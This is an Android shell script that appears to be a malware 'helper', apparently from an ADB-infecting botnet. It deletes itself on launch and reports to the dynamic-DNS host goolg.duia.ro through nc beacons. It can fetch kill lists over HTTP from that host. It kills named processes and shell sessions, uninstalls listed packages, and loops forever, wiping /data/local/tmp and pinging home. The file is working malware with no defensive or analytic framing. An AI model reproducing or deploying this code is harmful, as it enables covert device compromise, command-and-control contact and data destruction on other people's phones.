#!/system/bin/sh

killBadProcesses()
{
	while read p; do
		ret=$(killall -9 $p)
	done <$dir/badps

	while read p; do
		ret=$(pkill $p)
	done <$dir/badps

	while read p; do
		ret=$(kill -s 9 `pidof $p`)
	done <$dir/badps

	ps=$(ps | grep shell | grep -v '\/' | grep -E 'S ............+$' | grep -o '^shell *[0-9]\{3,6\} ' | grep -o '[0-9]\{3,6\}')
	ret=$(kill -9 $ps)
}

uninstallBadPackages()
{
	while read p; do
		pack=$(pm list package | grep $p)
		if [ -z "pack" ]; then
			ret=$(am force-stop $p)
			ret=$(pm uninstall $p)
		fi
	done <$dir/badpacks
}

removeBadFiles()
{
#	rm -rf /data/local/tmp/*
#	rm /data/local/tmp/adbs
#	rm /data/local/tmp/adbs2
#	rm /data/local/tmp/z
#	rm /data/local/tmp/f
#	rm /data/local/tmp/m7m
#	rm /data/local/tmp/r
#	rm /data/local/tmp/.HqMBksnBExR82Ja
#	rm -rf /data/local/tmp/perfd
}

getInternet()
{
	ret=$(type busybox)
	if [[ ! "$ret" = *"not found"* ]]; then
		cmd="busybox wget -O $dir/"; #echo "Found busybox at $ret"
	else
		ret=$(type toybox)
		if [[ ! "$ret" = *"not found"* ]]; then
			cmd="toybox wget -O $dir/"; #echo "Found toybox at $ret"
		else
			ret=$(type wget)
			if [[ ! "$ret" = *"not found"* ]]; then
				cmd="wget -O $dir/"; #echo "Found wget at $ret"
			else
				ret=$(type curl)
				if [[ ! "$ret" = *"not found"* ]]; then
					cmd="curl -o $dir/"; #echo "Found busybox at $ret"
				fi
			fi
		fi
	fi

	echo $cmd
}

getBadStuff()
{
	ping -c1 goolg.duia.ro | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' > $dir/ip
	IFS= read -r ip <$dir/ip
	echo "Getting list of bad processes.."
	${get}badps http://$ip:56615/badps
	echo "Done"
	echo
	echo "Getting list of bad packages.."
	${get}badpacks http://$ip:56615/badpacks
	echo "Done"
}
rm -- "$0"

echo "$1 helper running!" | nc goolg.duia.ro 6615

dir=$(dirname "$0")
if [ -z "$dir" ]; then
	dir=$(cd ${0%/*} && pwd -P )
	if [ -z "$dir" ]; then
		dir=$(grep ^d | grep -o '.[[:alnum:]]\{5,100\}$')
	fi
fi

#get=$(getInternet)
#getBadStuff

echo "$1 killing bad stuff" | nc goolg.duia.ro 6615
killBadProcesses

echo "$1 uninstalling bad stuff" | nc goolg.duia.ro 6615
uninstallBadPackages

counter=0
while [ 1 ]
do
	counter=$((counter+1))
	sleep 3
	killBadProcesses
	rm -rf /data/local/tmp/*
	touch ticker

	if [[ "$counter" -gt 300 ]]; then
		echo "$1 ping!" | nc goolg.duia.ro 6615
		counter=0
	fi
done
